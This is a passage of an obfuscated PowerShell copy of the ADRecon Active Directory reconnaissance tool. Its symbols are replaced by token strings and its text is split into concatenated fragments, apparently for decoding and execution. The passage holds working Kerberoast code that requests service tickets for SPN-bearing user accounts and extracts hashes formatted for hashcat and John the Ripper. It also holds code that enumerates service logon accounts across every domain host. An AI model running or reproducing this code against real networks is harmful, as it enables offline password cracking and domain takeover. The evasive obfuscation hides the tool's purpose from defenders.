        # No easy way to parse ASN1, so wexfJ4ll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
        If (bLHTicketHexStream -match xfJ4a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)xfJ4)
        {
            bLHEtype = [Convert]::ToByte( bLHMatches.EtypeLen, 16 )
            bLHCipherTextLen = [Convert]::ToUInt32(bLHMatches.CipherTextLen, 16)-4
            bLHCipherText = bLHMatches.DataToEnd.Substring(0,bLHCipherTextLen*2)

            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
            If (bLHMatches.DataToEnd.Substring(bLHCipherTextLen*2, 4) -ne xfJ4A482xfJ4)
            {
                Write-Warning xfJ4[Get-ADRSPNTicket] Error parsing ciphertext for the SPN  bLH(bLHTicket.ServicePrincipalName).xfJ4 # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
                bLHHash = bLHnull
            }
            Else
            {
                bLHHash = lEzjbLH(bLHCipherText.Substring(0,32))pwObLHbLH(bLHCipherText.Substring(32))lEzj
            }
        }
        Else
        {
            Write-Warning lEzj[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  bLH(bLHTicket.ServicePrincipalName).lEzj # Use the TicketByteHexStream field and '+'extract the hash offline with Get-KerberoastHashFromAPReq
            bLHHash = bLHnull
        }
    }
    bLHObj = New-Object PSObject
    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjServicePrincipalNamelEzj -Value bLHTicket.ServicePrincipalName
    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjEtypelEzj -Value bLHEtype
    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjHashlEzj -Value bLHHash
    Return bLHObj
}

Function Get-ADRKerberoast
{
<#
.SYNOPSIS
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.DESCRIPTION
    Returns all user service principal name (SPN) '+'hashes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize
    )

    If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
    {
        bLHLogonToken = Get-ADRUserImpersonation -Credential bLHCredential
    }

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADUsers = Get-ADObject -LDAPFilter lEzj(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))lEzj -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize bLHPageSize
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRKerberoast] Error while enumerating UserSPN ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADUsers)
        {
            bLHUserSPNObj = @()
            bLHADUsers 0Ogv ForEach-Object {
                ForEach (bLHUserSPN in bLH_.servicePrincipalName)
                {
                    bLHObj = New-Object PSObject
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjUsernamelEzj -Value bLH_.sAMAccountName
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjServicePrincipalNamelEzj -Value bLHUserSPN

                    bLHHashObj = Get-ADRSPNTicket bLHUserSPN
                    If (bLHHashObj)
   '+'                 {
                        bLHUserDomain = bLH_.DistinguishedName.SubString(bLH_.DistinguishedName.IndexOf(xfJ4DC=xfJ4)) -replace xfJ4DC=xfJ4,xfJ4xfJ4 -replace xfJ4,xfJ4,xfJ4.xfJ4
                        # JohnTheRipper output format
                        bLHJTRHash = lEzjpwObLHkrb5tgspwObLHbLH(bLHHashObj.ServicePrincipalName):bLH(bLHHashObj.Hash)lEzj
                        # hashcat output format
                        bLHHashcatHash = lEzjpwObLHkrb5tgspwObLHbLH(bLHHashObj.Etype)pwObLH*bLH(bLH_.SamAccountName)pwObLHbLHUserDomainpwObLHbLH(bLHHashObj.ServicePrincipalName)*pwObLHbLH(bLHHashObj.Hash)lEzj
                    }
                    Else
                    {
                        bLHJTRHash = bLHnull
                        bLHHashcatHash = bLHnull
                    }
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Na'+'me lEzjJohnlEzj -Value bLHJTRHash
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjHashcatlEzj -Value bLHHashcatHash
                    bLHUserSPNObj += bLHObj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
   '+' {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjsamaccountnamelEzj,lEzjserviceprincipalnamelEzj,lEzjuseraccountcontrollEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj
        Try
        {
            bLHADUsers = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRKerberoast] Error while enumerating UserSPN ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADUsers)
        {
            bLHUserSPNObj = @()
            bLHADUsers 0Ogv ForEach-Object {
                ForEach (bLHUserSPN in bLH_.Properties.serviceprincipalname)
                {
                    bLHObj = New-Object PSObject
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjUsernamelEzj -Value bLH_.Properties.samaccountname[0]
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjServicePrincipalNamelEzj -Value bLHUserSPN

                    bLHHashObj = Get-ADRSPNTicket bLHUserSPN
                    If (bLHHashObj)
    '+'                {
                        bLHUserDomain = bLH_.Properties.distinguishedname[0].SubString(bLH_.Properties.distinguishedname[0].IndexOf(xfJ4DC=xfJ4)) -replace xfJ4DC=xfJ4,xfJ4xfJ4 -replace xfJ4,xfJ4,xfJ4.xfJ4
                        # JohnTheRipper output format
                        bLHJTRHash = lEzjpwObLHkrb5tgspwObLHbLH(bLHHashObj.ServicePrincipalName):bLH(bLHHashObj.Hash)lEzj
                        # hashcat output format
                        bLHHashcatHash = lEzjpwObLHkrb5tgspwObLHbLH(bLHHashObj.Etype)pwObLH*bLH(bLH_.Properties.samaccountname)pwObLHbLHUserDomainpwObLHbLH(bLHHashObj.ServicePrincipalName)*pwObLHbLH(bLHHashObj.Hash)lEzj
                    }
                    Else
                    {
                        bLHJTRHash = bLHnull
                        bLHHashcatHash = bLHnull
                    }
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjJohnlEzj -Value bLHJTRHash
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjHashcatlEzj -Value bLHHashcatHash
                    bLHUserSPNObj += bLHObj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If (bLHLogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle bLHLogonToken
    }

    If (bLHUserSPNObj)
    {
        Return bLHUserSPNObj
    }
    Else
    {
        Return bLHnull
    }
}

# based on https://gallery.technet.microsoft.com/scriptcenter/PowerShell-script-to-find-6fc15ecb
Function Get-ADRDomainAccountsusedforServiceLogon
{
<#
.SYNOPSIS
    Returns all accounts used by services on computers in an Active Directory domain.

.DESCRIPTION
    Retrieves a list of all computers in the current domain and reads service configuration using Get-WmiObject.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    BEGIN {
        bLHreadServiceAccounts = [scriptblock] {
            # scriptblock to retrieve service list form a remove machine
            bLHhostname = [string] bLHargs[0]
            bLHOperatingSystem = [string] bLHargs[1]
            #bLHCredential = [Management.Automation.PSCredential] bLHargs[2]
            bLHCredential = bLHargs[2]
            bLHtimeout = 250
            bLHport = 135
            Try
            {
                bLHtcpclient = New-Object System.Net.Sockets.TcpClient
                bLHresult = bLHtcpclient.BeginConnect(bLHhostname,bLHport,bLHnull,bLHnull)
                bLHsuccess = bLHresult.AsyncWaitHandle.WaitOne(bLHtimeout,bLHnull)
            }
            Catch
            {
                bLHwarning = lEzjbLHhostname (bLHOperatingSystem) is unreachable bLH(bLH_.Exception.Message)lEzj
                bLHsuccess = bLHfalse
                bLHtcpclient.Close()
            }
            If (bLHsuccess)
            {
                # PowerShellv2 does not support New-CimSession
                If (bLHPSVersionTable.PSVersion.Major -ne 2)
                {
                    If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        bLHsession = New-CimSession -ComputerName bLHhostname -SessionOption bLH(New-CimSessionOption -Protocol DCOM) -Credential bLHCredential
                        If (bLHsession)
                        {
                            bLHserviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession bLHsession -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        bLHsession = New-CimSession -ComputerName bLHhostname -SessionOption bLH(New-CimSessionOption -Protocol DCOM)
                        If (bLHsession)
                        {
                            bLHserviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession bLHsession -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        bLHserviceList = @( Get-WmiObject -Class Win32_Service -ComputerName bLHhostname -Credential bLHCredential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        bLHserviceList = @( Get-WmiObject -Class Win32_Service -ComputerName bLHhostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                bLHserviceList
            }
            Try
            {
                If (bLHtcpclient) { bLHtcpclient.EndConnect(bLHresult) 0Ogv Out-Null }
            }
            Catch
            {
                bLHwarning = lEzjbLHhostname (bLHOperatingSystem) : bLH(bLH_.Exception.Message)lEzj
            }
            bLHwarning
        }

        Function processCompletedJobs()
     '+'   {
            # reads service list from completed jobs,
            # updates bLHserviceAccount table and removes completed job'+'

            bLHjobs = Get-Job -State Completed
            ForEach( bLHjob in bLHjobs )
            {
                If (bLHnull -ne bLHjob)
                {
                    bLHdata = Receive-Job bLHjob
                    Remove-Job bLHjob
                }

                If (bLHdata)
                {
                    If ( bLHdata.GetType() -eq [Object[]] )
                    {
                        bLHserviceLi'+'st = bLHdata 0Ogv Where-Object { if (bLH_.StartName) { bLH_ }}
                        bLHserviceList 0Ogv ForEach-Object {
                            bLHObj = New-Object PSObject
                            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjAccountlEzj -Value bLH_.StartName
                            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjService NamelEzj -Value bLH_.Name
                            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjSystemNamelEzj -Value bLH_.SystemName
                            If (bLH_.StartName.toUpper().Contains(bLHcurrentDomain))
                            {
                                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRunning as Domain UserlEzj -Value bLHtrue
                            }
                            Else
                            {
                                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRunning as Domain UserlEzj -Value bLHfalse
                            }
                            bLHscript:serviceAccounts += bLHObj
                        }
                    }
                    ElseIf ( bLHdata.GetType() -eq [String] )
                    {
                        bLHscript:warnings += bLHdata
                        Write-Verbose bLHdata
                    }
                }
            }
        }
    }

    PROCESS
    {
        bLHscript:serviceAccounts = @()
        [string[]] bLHwarnings = @()
        If (bLHMethod -eq xfJ4ADWSxfJ4)
        {
            Try
            {
                bLHADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomainAccountsusedforServiceLogon] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            If (bLHADDomain)
            {
                bLHcurrentDomain = bLHADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                bLHcurrentDomain = lEzjlEzj
                Write-Warning lEzjCurrent Domain could not be retrieved.lEzj
            }

            Try
            {
                bLHADComputers = Get-ADComputer -Filter { Enabled -eq bLHtrue -and OperatingSystem -Like lEzj*Windows*lEzj } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }

            If (bLHADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to bLHThreads threads
                bLHcnt = bLH([ADRecon.ADWSClass]::ObjectCount(bLHADComputers))
                Write-Verbose lEzj[*] Total Windows Hosts: bLHcntlEzj
                bLHicnt = 0
                bLHADComputers 0Ogv ForEach-Object {
                    bLHStopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( bLH_.dnshostname )
	                {
                        bLHargs = @(bLH_.DNSHostName, bLH_.OperatingSystem, bLHCredential)
		                Start-Job -ScriptBlock bLHreadServiceAccounts -Name lEzjread_bLH(bLH_.name)lEzj -ArgumentList bLHargs 0Ogv Out-Null
		                ++bLHicnt
		                If (bLHStopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity lEzjRetrieving data from serverslEzj -Status lEzjbLH(lEzj{0:N2}lEzj -f ((bLHicnt/bLHcnt*100),2)) % Complete:lEzj -PercentComplete 100
'+'                            bLHStopWatch.Reset()
                            bLHStopWatch.Start()
		            '+'    }
                        while ( ( Get-Job -State Running).count -ge bLHThreads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs

                Write-Progress -Activity lEzjRetrieving data from serverslEzj -Status lEzjWaiting for background jobs to complete...lEzj -PercentComplete 100
                Wait-Job -State Running -Timeout 30  0Ogv Out-Null
                Get-Job -State Running 0Ogv Stop-Job
                processCompletedJobs
                Write-Progress -Activity lEzjRetrieving data from serverslEzj -Completed -Status lEzjAll DonelEzj
            }
        }

        If (bLHMethod -eq xfJ4LDAPxfJ4)
        {
            bLHcurrentDomain = ([string](bLHobjDomain.name)).toUpper()

            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSearcher.Filter = lEzj(&(samAccountType=805306369)(!userAccountControl:1.2.840.113556.1.4.803:=2)(operatingSystem=*Windows*))lEzj
            bLHObjSearcher.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjdnshostnamelEzj,lEzjoperatingsystemlEzj))
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj

            Try
            {
                bLHADComputers = bLHObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            bLHObjSearcher.dispose()

            If (bLHADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to bLHThreads threads
                bLHcnt = bLH([ADRecon.LDAPClass]::ObjectCount(bLHADComputers))
                Write-Verbose lEzj[*] Total Windows Hosts: bLHcntlEzj
                bLHicnt = 0
                bLHADComputers 0Ogv ForEach-Object {
                    If( bLH_.Properties.dnshostname )
	                {
                        bLHargs = @(bLH_.Properties.dnshostname, bLH_.Properties.operatingsystem, bLHCredential)
		                '+'Start-Job -ScriptBlock bLHreadServiceAccounts -Name lEzjread_bLH(bLH_.Properties.name)lEzj -ArgumentList bLHargs 0Ogv Out-Null
		                ++bLHicnt
		                If (bLHStopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity lEzjRetrieving data from serverslEzj -Sta'+'tus lEzjbLH(lEzj{0:N2}'+'lEzj -f ((bLHicnt/bLHcnt*100),2)) % Complete:lEzj -PercentComplete 100
                            bLHStopWatch.Reset()
                            bLHStopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge bLHThreads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs
                Write-Progress -Activity lEzjRetrieving data from serverslEzj -Status lEzjWaiting for background jobs to complete...lEzj -PercentComplete 100
                Wait-Job -State Running -Timeout 30  0Ogv Out-Null
                Get-Job -State Running 0Ogv Stop-Job
                processCompletedJobs
                Write-Progress -Activity lEzjRetrieving data from serverslEzj -Completed -Status lEzjAll DonelEzj
            }
        }

        If (bLHscript:serviceAccounts)
        {
            Return bLHscript:serviceAccounts
        }
        Else
        {
            Return bLHnull
        }
    }
}

Function Remove-EmptyADROutputDir
{
<#
.SYNOPSIS
    Remov'+'es ADRecon output folder if empty.

.DESCRIPTION
    Removes ADRecon output folder if empty.

.PARAMETER ADROutputDir
    [string]
	Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHADROutputDir,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHOutputType
    )

    Switch (bLHOutputType)
    {
        xfJ4CSVxfJ4
        {
            bLHCSVPath  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4CSV-FilesxfJ4)
            If (!(Test-Path -Path bLHCSVPathcnI*))
            {
                Write-Verbose lEzjRemoved Empty Directory bLHCSVPathlEzj
                Remove-Item bLHCSVPath
            }
        }
        xfJ4XMLxfJ4
        {
            bLHXMLPath  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4XML-FilesxfJ4)
            If (!(Test-Path -Path bLHXMLPathcnI*))
            {
                Write-Verbose lEzjRemoved Empty Directory bLHXMLPathlEzj
                Remove-Item bLHXMLPath
            }
        }
        xfJ4JSONxfJ4
        {
            bLHJSONPath  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4JSON-FilesxfJ4)
            If (!(Test-Path -Path bLHJSONPathcnI*))
            {
                Write-Verbose lEzjRemoved Empty Directory bLHJSONPathlEzj
                Remove-Item bLHJSONPath
            }
        }
        xfJ4HTMLxfJ4
        {
            bLHHTMLPath  = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4HTML-FilesxfJ4)
            If (!(Test-Path -Path bLHHTMLPathcnI*))
            {
                Write-Verbose lEzjRemoved Empty Directory bLHHTMLPathlEzj
                Remove-Item bLHHTMLPath
            }
        }
    }
    If (!(Test-Path -Path bLHADROutputDircnI*))
    {
        Remove-Item bLHADROutputDir
        Write-Verbose lEzjRemoved Empty Directory bLHADROutputDirlEzj
    }
}

Function Get-ADRAbout
{
<#
.SYNOPSIS
    Returns information about ADRecon.

.DESCRIPTION
    Returns information about ADRecon.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date

.PARAMETER ADReconVersion
    [string]
    ADRecon Version.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER RanonComputer
    [string]
    Details of the Computer running ADRecon.

.PARAMETER TotalTime
    [string]
    TotalTime.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHdate,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHADReconVersion,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHRanonComputer,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHTotalTime
    )

    bLHAboutADRecon = @()

    bLHVersion = bLHMethod + lEzj VersionlEzj

    If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
    {
        bLHUsername = bLH(bLHCredential.UserName)
    }
    Else
    {
        bLHUsername = bLH([Environment]::UserName)
    }

    bLHObjValues = @(lEzjDatelEzj, bLH(bLHdate), lEzjADReconlEzj, lEzjhttps://github.com/adrecon/ADReconlEzj, bLHVersion, bLH(bLHADReconVersion), lEzjRan as userlEzj, bLHUsername, lEzjRan on computerlEzj, bLHRanonComputer, lEzjExecution Time (mins)lEzj, bLH(bLHTotalTime))

    For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
    {
        bLHObj = New-Object PSObject
        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value bLHObjValues[bLHi]
        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
        bLHi++
        bLHAboutADRecon += bLHObj
    }
    Return bLHAboutADRecon
}

Function Invoke-ADRecon
{
<#
.SYNOPSIS
    Wrapper function to run ADRecon modules.

.DESCRIPTION
    Wrapper function to set variables, check dependencies and run ADRecon modules.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER Collect
    [array]
    Which modules to run; Tenant, Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, GroupChanges, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PA'+'RAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER OutputDir
    [string]
	Path for ADRecon output folder to save the CSV files and the ADRecon-Report.xlsx.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.OUTPUTS
    STDOUT, CSV, XML, JSON, HTML and/or Excel file is created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = bLHfalse)]
        [string] bLHGenExcel,

        [Parameter(Mandatory = bLHfalse)]
        [ValidateSet(xfJ4ADWSxfJ4, xfJ4LDAPxfJ4'+')]
        [string] bLHMethod = xfJ4ADWSxfJ4,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHCollect,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController = xfJ4xfJ4,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHOutputType,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHADROutputDir,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHDormantTimeSpan = 90,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHPassMaxAge = 30,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHPageSize = 200,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHUseAltCreds = bLHfalse
    )

    [string] bLHADReconVersion = lEzjv1.24lEzj
    Write-Output lEzj[*] ADRecon bLHADReconVersion by Prashant Mahajan (@prashant3535)lEzj

    If (bLHGenExce'+'l)
    {
        If (!(Test-Path bLHGenExcel))
        {
            Write-Output lEzj[Invoke-ADRecon] Invalid Path ... ExitinglEzj
            Return bLHnull
        }
        Export-ADRExcel -ExcelPath bLHGenExcel
        Return bLHnull
    }

    # Suppress verbose output
    bLHSaveVerbosePreference = bLHscript:VerbosePreference
    bLHscript:VerbosePreference = xfJ4SilentlyContinuexfJ4
    Try
    {
        If (bLHPSVersion'+'Table.PSVersion.Major -ne 2)
        {
            bLHcomputer = Get-CimInstance -ClassName Win32_ComputerSystem
            bLHcomputerdomainrole = (bLHcomputer).DomainRole
        }
        Else
        {
            bLHcomputer = Get-WMIObject win32_computersystem
            bLHcomputerdomainrole = (bLHcomputer).DomainRole
        }
    }
    Catch
    {
        Write-Output lEzj[Invoke-ADRecon] bLH(bLH_.Exception.Message)lEzj
    }
    If (bLHSaveVerbosePreference)
    {
        bLHscript:VerbosePreference = bLHSaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch (bLHcomputerdomainrole)
    {
        0
        {
            [string] bLHcomputerrole = lEzjStandalone WorkstationlEzj
            bLHEnv:ADPS_LoadDefaultDrive = 0
            bLHUseAltCreds = bLHtrue
        }
        1 { [string] bLHcomputerrole = lEzjMember WorkstationlEzj }
        2
        {
            [string] bLHcomputerrole = lEzjStandalone ServerlEzj
            bLHUseAltCreds = bLHtrue
            bLHEnv:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] bLHcomputerrole = lEzjMember ServerlEzj }
        4 { [string] bLHcomputerrole = lEzjBackup Domain ControllerlEzj }
        5 { [string] bLHcomputerrole = lEzjPrimary Domain ControllerlEzj }
        default { Write-Output lEzjComputer Role could not be identified.lEzj }
    }

    bLHRanonComputer = lEzjbLH(bLHcomputer.domain)cnIbLH([Environment]::MachineName) - bLH(bLHcomputerrole)lEzj
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    # If either DomainController or Credentials are provided, treat as non-member
    If ((bLHDomainController -ne lEzjlEzj) -or (bLHCredential -ne [Management.Automation.PSCredential]::Empty))
    {
        # Disable loading of default drive on member
        If ((bLHMethod -eq xfJ4ADWSxfJ4) -and (-Not bLHUseAltCreds))
        {
            bLHEnv:ADPS_LoadDefaultDrive = 0
        }
        bLHUseAltCreds = bLHtrue
    }

    # Import ActiveDirectory module
    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        If (Get-Module -ListAvailable -N'+'ame ActiveDirectory)
        {
            Try
            {
                # Suppress verbose output on module import
                bLHSaveVerbosePreference = bLHscript:VerbosePreference;
                bLHscript:VerbosePreference = xfJ4SilentlyContinuexfJ4;
                Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop 0Ogv Out-Null
                If (bLHSaveVerbosePreference)
                {
                    bLHscript:VerbosePreference = bLHSaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
            }
            Catch
            {
                Write-Warning lEzj[Invoke-'+'ADRecon] Error importing ActiveDirectory Module from RSAT (Remote Server Administration Tools) ... Continuing with LDAPlEzj
                bLHMethod = xfJ4LDAPxfJ4
                If (bLHSaveVerbosePreference)
                {
                    bLHscript:VerbosePreference = bLHSaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
        }
        Else
        {
            Write-Warning lEzj[Invoke-ADRecon] ActiveDirectory Module from RSAT (Remote Server Administration Tools) is not installed ... Continuing with LDAPlEzj
            bLHMethod = xfJ4LDAPxfJ4
        }
    }

    # Compile C# code
    # Suppress Debug output
    bLHSaveDebugPreference = bLHscript:DebugPreference
    bLHscript:DebugPreference = xfJ4SilentlyContinuexfJ4
    Try
    {
        bLHAdvapi32 = Add-Type -MemberDefinition bLHAdvapi32Def -Name lEzjAdvapi32lEzj -Namespace ADRecon -PassThru
        bLHKernel32 = Add-Type -MemberDefinition bLHKernel32Def -Name lEzjKernel32lEzj -Namespace ADRecon -PassThru
        #Add-Type -TypeDefinition bLHPingCastleSMBScannerSource
        bLHCLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If (bLHMethod -eq xfJ4ADWSxfJ4)
        {
            <#
            If (bLHPSVersionTable.PSEdition -eq lEzjCorelEzj)
            {
                bLHrefFolder = Join-Path -Path (Split-Path([PSObject].Assembly.Location)) -ChildPath lEzjreflEzj
                Add-Type -TypeDefinition bLH(bLHADWSSource+bLHPingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.DirectoryServiceslEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Linq.dlllEzj)
                    #([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.LinqlEzj)).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(lEzjSystem.Management.AutomationlEzj)).Location
                    (Join-Path -Path bLHrefFolder -ChildPath lEzjSystem.Collections.dlllEzj)
